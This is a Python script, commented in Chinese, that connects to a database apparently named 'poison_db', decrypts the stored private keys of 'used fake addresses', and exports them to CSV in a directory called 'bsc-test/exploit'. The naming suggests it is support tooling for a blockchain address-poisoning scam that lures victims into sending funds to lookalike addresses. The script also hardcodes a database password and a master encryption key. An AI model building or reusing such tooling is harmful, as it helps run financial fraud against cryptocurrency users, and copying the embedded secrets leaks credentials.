#!/usr/bin/env python3
"""
导出 used_fake_addresses 表中的伪造地址和解密后的私钥到CSV
用法: python3 export_used_addresses.py
"""

import os
import csv
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import psycopg2

# ============ 配置 ============
DB_HOST = os.getenv("DB_HOST", "127.0.0.1")
DB_PORT = os.getenv("DB_PORT", "5432")
DB_NAME = os.getenv("DB_NAME", "poison_db")
DB_USER = os.getenv("DB_USER", "poison_db")
DB_PASS = os.getenv("DB_PASS", "D07dZedJebQH1VXDPu8db8wM2aN523jy9v")

# 主密钥 (与Go程序相同)
MASTER_KEY = os.getenv("MASTER_KEY", "d909c4631fd3aed65fe72d6e8b0796d04eab6afb7b26adb557ba927650dba691")

# 导出目录
EXPORT_DIR = os.getenv("EXPORT_DIR", "/root/bsc-test/exploit")
# ==============================


def derive_key(master_key: bytes) -> bytes:
    """派生加密密钥 (与Rust生成器相同的算法)"""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=b"address-generator-salt",
        iterations=10000,
    )
    return kdf.derive(master_key)


def decrypt_private_key(encrypted: bytes, derived_key: bytes) -> str:
    """解密私钥"""
    if len(encrypted) != 60:
        raise ValueError(f"Invalid encrypted key length: {len(encrypted)}")

    nonce = encrypted[:12]
    ciphertext = encrypted[12:]

    aesgcm = AESGCM(derived_key)
    plaintext = aesgcm.decrypt(nonce, ciphertext, None)

    return plaintext.hex()


def main():
    print("🔐 正在连接数据库...")

    # 连接数据库
    conn = psycopg2.connect(
        host=DB_HOST,
        port=DB_PORT,
        dbname=DB_NAME,
        user=DB_USER,
        password=DB_PASS
    )
    cursor = conn.cursor()

    # 派生密钥
    derived_key = derive_key(MASTER_KEY.encode('utf-8'))

    # 查询 used_fake_addresses 表
    print("📊 正在查询已使用的伪造地址...")
    cursor.execute("""
        SELECT address, encrypted_private_key, use_count, first_used_at
        FROM used_fake_addresses
        ORDER BY first_used_at DESC
    """)

    rows = cursor.fetchall()
    print(f"📋 查询到 {len(rows)} 个地址")

    if len(rows) == 0:
        print("⚠️  没有找到已使用的伪造地址")
        cursor.close()
        conn.close()
        return

    # 创建导出目录 (按日期)
    date_dir = os.path.join(EXPORT_DIR, datetime.now().strftime("%Y-%m-%d"))
    os.makedirs(date_dir, exist_ok=True)

    # 生成文件名
    filename = f"used_addresses_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    filepath = os.path.join(date_dir, filename)

    # 写入CSV
    success_count = 0
    error_count = 0

    with open(filepath, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['address', 'private_key', 'use_count', 'first_used_at'])

        for address, encrypted_pk, use_count, first_used_at in rows:
            try:
                if encrypted_pk:
                    private_key = decrypt_private_key(bytes(encrypted_pk), derived_key)
                    # 地址加上0x前缀
                    addr = address.strip()
                    if not addr.startswith('0x'):
                        addr = '0x' + addr
                    writer.writerow([addr, private_key, use_count, first_used_at])
                    success_count += 1
            except Exception as e:
                print(f"⚠️  解密失败: {address[:16]}... - {e}")
                error_count += 1

    cursor.close()
    conn.close()

    print(f"\n✅ 导出完成!")
    print(f"📁 文件: {filepath}")
    print(f"📊 成功: {success_count}, 失败: {error_count}")


if __name__ == "__main__":
    main()

